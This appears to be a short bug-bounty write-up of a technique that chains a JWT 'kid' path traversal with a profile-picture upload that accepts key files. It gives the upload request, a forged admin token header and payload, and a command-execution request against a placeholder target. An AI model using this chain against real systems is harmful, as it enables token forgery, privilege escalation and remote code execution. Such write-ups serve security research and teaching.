The overlooked low bug

    JWT uses kid (Key ID) header parameter to fetch verification key from file:// or https://

    Many apps allow kid: ../../../../etc/passwd but sanitize error messages → low severity (info leak only)

The chaining enabler

    App has file upload for profile pictures → but also accepts .pem files disguised as .jpg (no magic byte check)

Advanced chain
Step 1 – Upload malicious RSA key as "profile picture"
http

POST /api/v1/user/avatar HTTP/1.1
Host: target.com
Authorization: Bearer <user_token>
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="key.jpg"
Content-Type: image/jpeg

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA... (attacker-controlled key)
-----END RSA PRIVATE KEY-----
------WebKitFormBoundary--

Server stores it at:
/uploads/avatars/2026/04/14/key.jpg
Step 2 – Craft malicious JWT with kid path traversal
json

Header:
{
  "alg": "RS256",
  "kid": "../../uploads/avatars/2026/04/14/key.jpg"
}

Payload:
{
  "user_id": "admin",
  "role": "super_admin",
  "exp": 9999999999
}

Step 3 – Send JWT to privileged endpoint
http

GET /api/v1/admin/system/exec?cmd=id HTTP/1.1
Host: target.com
Authorization: Bearer <crafted_jwt>

Server fetches key from traversed path, uses attacker's key to verify → RCE as admin.

Why P1: Remote code execution on production.
